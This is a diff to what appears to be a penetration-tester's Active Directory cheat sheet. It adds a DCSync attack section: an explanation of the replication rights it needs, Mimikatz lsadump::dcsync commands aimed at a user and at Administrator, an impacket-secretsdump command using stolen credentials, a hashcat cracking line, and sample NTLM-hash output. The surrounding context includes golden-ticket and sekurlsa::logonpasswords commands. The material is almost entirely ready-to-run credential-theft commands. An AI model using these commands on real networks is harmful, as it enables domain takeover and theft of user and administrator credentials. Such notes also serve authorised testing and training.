@@ -100,6 +100,9 @@ net user username
 #AD
 net user /domain username
 
+#Show in-memory tickets
+klist
+
 
 #Show account policy (password requirements, lockout threshold etc.)
 net accounts
@@ -603,5 +606,24 @@ privilege::debug
 sekurlsa::logonpasswords
 #The Domain SID can be obtained from the previous or by issuing whoami /user (remember to omit RID (the last part))
 #You can use the enumhelper.ps1 to list SPNs, but you should already be aware of the SPN you're targeting
-#Now to incject the ticket into hosts memory (/ptt)
+#Now to incject the ticket into hosts memory (/ptt), rc4 == NTLM-hash
 kerberos::golden /sid:S-1-5-21-809893099-1472282828-2400958209 /domain:testad.local /ptt /target:www01.testad.local /service:http /rc4:1c23dg4567e89012345678b90123db45 /user:username
+
+##Directory Replication Service (DRS) - replication, dcsync attack
+#In multi DC environments you can impersonate a DC and request updates etc. on objects, if your SID has needed privileges, the target DC will not check if the request comes from a
+#known source. These requests are normally performed by DCs using IDL_DRSGetNCChanges API. To launch a rogue replication request, the user used needs to have following permissions:
+# 1. Replicating Directory Changes
+# 2. Replicating Directory Changes All
+# 3. Replicating Directory Changes in Filtered Set
+#By default Domain- and Enterprise Admins and Administrators groups have these rights.
+#If you have an account with these righs under your control, you can perform dcsync attack with Mimikatz, just define the user whose credentials you're targeting, should result
+#amongst other things with the targeted user's NTLM hash:
+lsadump::dcsync /user:testad\target-username
+#or you can even go for admin with:
+lsadump::dcsync /user:testad\Administrator
+#Save the hash on your Linux host and start cracking with hashcat:
+hashcat -m 1000 dcsync.hash /home/user/tools/wordlists/rockyou.txt -r /home/user/tools/hashcat/rules/best64.rule --force
+#Linux can also be used to perform the dsync attack with impacket, target-username being the user whose credentials we're after, then domain/username:"password"@DC-IP-address:
+impacket-secretsdump -just-dc-user target-username testad.local/compromiseduser:"compromised-user-password\!"@192.168.23.45
+#Impacket output should look something like the following, where the last part is the NTML-hash of the user. Impacket leverages DRSUAPI:
+target-username:1025:bad1d471e70812ebcaa1e913e80401da:12e3d45c6b7a89b01b2cde3456789012:::
